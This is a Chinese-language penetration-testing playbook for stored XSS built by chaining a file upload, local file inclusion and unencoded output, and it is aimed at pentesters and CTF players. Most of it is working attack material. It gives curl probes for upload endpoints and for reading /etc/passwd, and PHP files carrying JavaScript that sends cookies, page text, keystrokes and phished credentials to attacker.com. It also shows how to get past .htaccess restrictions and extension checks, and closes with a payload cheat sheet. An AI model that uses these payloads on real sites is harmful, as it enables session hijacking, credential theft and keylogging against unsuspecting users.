# **存储型 XSS 通过文件上传与 LFI 链**

**文档说明：** 本文档提供通过文件上传与本地文件包含 (LFI) 漏洞链组合实现存储型 XSS 攻击的系统化方法，指导渗透测试人员利用多漏洞组合进行深度利用。

---

# **第一部分：文档概述**

## **1.1 编写目的**
- 为渗透测试人员提供文件上传+LFI 组合攻击的标准化流程
- 帮助理解多漏洞链式利用的原理和方法
- 提供存储型 XSS 持久化利用的技术指导

## **1.2 适用范围**
- 适用于同时存在文件上传和 LFI 漏洞的应用
- 适用于上传目录有 PHP 执行限制但可被 LFI 绕过的场景
- 适用于 CTF 挑战、渗透测试项目中的组合漏洞利用

## **1.3 读者对象**
- 执行渗透测试任务的安全工程师
- 负责代码审计的开发人员
- CTF 参赛选手

---

# **第二部分：核心渗透技术专题**

## **专题：存储型 XSS 通过文件上传与 LFI 链**

# **2.1 技术介绍**

**攻击链原理：**
该攻击链组合三个独立漏洞形成完整的存储型 XSS 攻击：
1. ** unrestricted File Upload** - 无限制文件上传漏洞
2. **Local File Inclusion (LFI)** - 本地文件包含漏洞
3. **Unencoded Output** - 未编码输出漏洞

**本质：** 通过文件上传存储恶意内容，通过 LFI 执行恶意 PHP 文件，通过未编码输出在受害者浏览器执行 JavaScript。

**攻击流程：**
```
攻击者上传恶意 PHP 文件 → 文件存储在 uploads/目录 → 
LFI 包含上传的 PHP 文件 → PHP 执行定义恶意内容变量 → 
未编码输出到页面 → 受害者访问时执行 JavaScript
```

# **2.2 攻击常见于哪些业务场景**

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **博客系统** | 文章上传 + 文章查看 | 上传恶意文章通过 LFI 触发 XSS |
| **文档管理系统** | 文档上传 + 在线预览 | 上传恶意文档通过包含触发 XSS |
| **内容管理系统** | 内容提交 + 内容展示 | 上传恶意内容通过渲染触发 XSS |
| **CTF 挑战** | 文件上传 + 文件查看 | 组合漏洞读取 Flag 或执行代码 |

# **2.3 漏洞探测方法**

## **2.3.1 识别文件上传功能**
```bash
# 查找上传端点
curl http://target.com/upload
curl http://target.com/submit
curl http://target.com/post-article

# 测试文件上传限制
curl -X POST http://target.com/upload \
  -F "file=@test.php"
# 如果成功上传，说明无文件类型限制
```

## **2.3.2 识别 LFI 漏洞**
```bash
# 测试文件包含点
curl "http://target.com/post.php?id=article1"

# 测试路径遍历
curl "http://target.com/post.php?id=../etc/passwd"

# 测试绝对路径
curl "http://target.com/post.php?id=/etc/passwd"
# 如果返回文件内容，LFI 漏洞存在
```

## **2.3.3 确认输出编码**
```bash
# 检查输出是否编码
curl "http://target.com/post.php?id=test" | grep -i "<script>"

# 如果用户输入未编码输出，XSS 漏洞存在
```

# **2.4 漏洞利用方法**

## **2.4.1 创建恶意 PHP 文件**

**Payload 结构：**
```php
<?php
$post_title = "Legitimate Article Title";
$post_brief = "This appears to be a normal article.";
$post_author = "John Doe";
$post_content = '<img src=x onerror="fetch(\'http://attacker.com/?cookie=\'+document.cookie)">';
?>
```

**完整示例：**
```bash
cat > /tmp/malicious.php << 'EOF'
<?php
$post_title = "System Security Best Practices";
$post_brief = "Learn about important security measures.";
$post_author = "Security Team";
$post_content = '<script>
    fetch("http://attacker.com/?data="+btoa(document.body.innerText))
    .then(r=>r.text())
    .then(console.log);
</script>';
?>
EOF
```

## **2.4.2 上传恶意文件**

**利用步骤：**
```bash
# 上传恶意 PHP 文件
curl -X POST http://target.com/upload \
  -F "name=Attacker" \
  -F "email=attacker@test.com" \
  -F "articleFile=@/tmp/malicious.php"

# 确认上传成功
# 返回："Thank you for submitting your article"
```

## **2.4.3 通过 LFI 触发 XSS**

**利用步骤：**
```bash
# 通过 LFI 包含上传的文件
curl "http://target.com/post.php?id=uploads/malicious"

# 或者使用相对路径
curl "http://target.com/post.php?id=../uploads/malicious"

# PHP 执行恶意文件，$post_content 被定义
# 未编码输出到页面，JavaScript 执行
```

## **2.4.4 高级 Payload 示例**

**凭证窃取 Payload：**
```php
<?php
$post_title = "Login Required";
$post_content = '<script>
var overlay = document.createElement("div");
overlay.innerHTML = "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999"><div style=\"position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border-radius:10px\"><h2>Session Expired</h2><form id=\"phish\"><input name=\"user\" placeholder=\"Username\" required><br><input name=\"pass\" type=\"password\" placeholder=\"Password\" required><br><button>Re-login</button></form></div></div>";
document.body.appendChild(overlay);
document.getElementById("phish").onsubmit = function(e) {
  e.preventDefault();
  fetch("http://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({
      user: this.user.value,
      pass: this.pass.value,
      url: location.href
    })
  });
};
</script>';
?>
```

**数据外带 Payload：**
```php
<?php
$post_title = "Article";
$post_content = '<script>
fetch("http://attacker.com/?data="+btoa(document.body.innerText.substring(0,500)));
</script>';
?>
```

**键盘记录 Payload：**
```php
<?php
$post_title = "News";
$post_content = '<script>
document.addEventListener("keydown", function(e) {
  fetch("http://attacker.com/log?key="+encodeURIComponent(e.key));
});
</script>';
?>
```

# **2.5 绕过方法**

## **2.5.1 绕过上传目录 PHP 执行限制**

**场景：** uploads/目录有 `.htaccess` 禁止 PHP 执行

**绕过原理：**
- `.htaccess` 仅阻止 HTTP 直接访问执行 PHP
- PHP `include()` 函数不受`.htaccess` 限制
- 通过 LFI 的 `include()` 可执行上传的 PHP 文件

**绕过步骤：**
```bash
# 1. 上传 PHP 文件（.htaccess 不阻止上传）
curl -X POST http://target.com/upload \
  -F "file=@shell.php"

# 2. 直接 HTTP 访问（被.htaccess 阻止）
curl http://target.com/uploads/shell.php
# 返回：PHP 源码（不执行）

# 3. 通过 LFI 包含（绕过.htaccess）
curl "http://target.com/post.php?id=uploads/shell"
# PHP 代码被执行
```

## **2.5.2 绕过路径遍历过滤**

**场景：** 应用过滤`..` 但允许 uploads/相对路径

**绕过 Payload：**
```bash
# 直接使用 uploads/相对路径（无需..）
curl "http://target.com/post.php?id=uploads/malicious"

# 如果过滤 uploads，尝试绝对路径
curl "http://target.com/post.php?id=/var/www/html/uploads/malicious"
```

## **2.5.3 绕过内容检查**

**场景：** 应用检查文件内容但仅检查扩展名

**绕过方法：**
```bash
# 创建双扩展名文件
cat > malicious.php.html << 'EOF'
<?php /* HTML comment */ ?>
<script>alert('XSS')</script>
EOF

# 或者使用图片马
cat > malicious.jpg << 'EOF'
<?php
$post_content = '<script>alert("XSS")</script>';
?>
EOF

# 上传时修改扩展名
curl -X POST http://target.com/upload \
  -F "file=@malicious.jpg.php"
```

# **2.6 实战案例**

## **案例：Encoder64 Blog 存储型 XSS 攻击**

**目标：** 通过文件上传+LFI 链实现存储型 XSS

**步骤 1：创建恶意 PHP 文件**
```bash
cat > /tmp/xss_payload.php << 'EOF'
<?php
$post_title = "Security Article";
$post_brief = "Learn about security.";
$post_author = "Attacker";
$post_content = '<img src=x onerror="fetch(\'http://attacker.com:8888/?vuln=STORED-XSS&cookie=\'+document.cookie)">';
?>
EOF
```

**步骤 2：上传恶意文件**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Attacker" \
  -F "email=attacker@test.com" \
  -F "articleFile=@/tmp/xss_payload.php"
```

**步骤 3：触发 XSS**
```bash
# 通过 LFI 包含上传的文件
curl "http://localhost:36367/post.php?id=uploads/xss_payload"

# 受害者访问时 JavaScript 执行
# Cookie 被窃取到 attacker.com:8888
```

---

# **第三部分：附录**

## **3.1 攻击链总结**

| **阶段** | **漏洞** | **作用** |
| :--- | :--- | :--- |
| 1 | 文件上传 | 存储恶意 PHP 文件 |
| 2 | LFI | 执行上传的 PHP 文件 |
| 3 | 未编码输出 | 在受害者浏览器执行 JavaScript |

## **3.2 常用 Payload 速查表**

| **Payload 类型** | **示例** | **说明** |
| :--- | :--- | :--- |
| Cookie 窃取 | `<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">` | 窃取会话 |
| 数据外带 | `<script>fetch('http://attacker.com/?d='+btoa(document.body.innerText))</script>` | 提取页面内容 |
| 钓鱼攻击 | 注入假登录表单 | 窃取凭证 |
| 键盘记录 | `document.addEventListener('keydown',...)` | 记录按键 |
| 页面篡改 | `document.body.innerHTML='Hacked'` | 修改页面内容 |

## **3.3 利用决策流程图**

```
                    ┌─────────────────┐
                    │  发现文件上传    │
                    └────────┬────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │  测试上传限制    │
                    │  文件类型/大小   │
                    └────────┬────────┘
                             │
                ┌────────────┴────────────┐
                │                         │
                ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  有严格限制   │          │  无限制/弱限制│
        └──────┬───────┘          └──────┬───────┘
               │                         │
               ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  尝试绕过     │          │  上传恶意文件 │
        │  双扩展名等   │          │  PHP/HTML    │
        └──────────────┘          └──────┬───────┘
                                         │
                                         ▼
                                  ┌─────────────────┐
                                  │  发现文件包含点  │
                                  │  post.php?id=   │
                                  └────────┬────────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │  测试 LFI 漏洞    │
                                  │  ?id=../etc/...  │
                                  └────────┬────────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │  包含上传文件    │
                                  │  ?id=uploads/...│
                                  └────────┬────────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │  PHP 执行 +XSS   │
                                  │  存储型攻击完成  │
                                  └─────────────────┘
```

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用技能：** injection  
**关联 OWASP Top 10：** A03:2025 - Injection
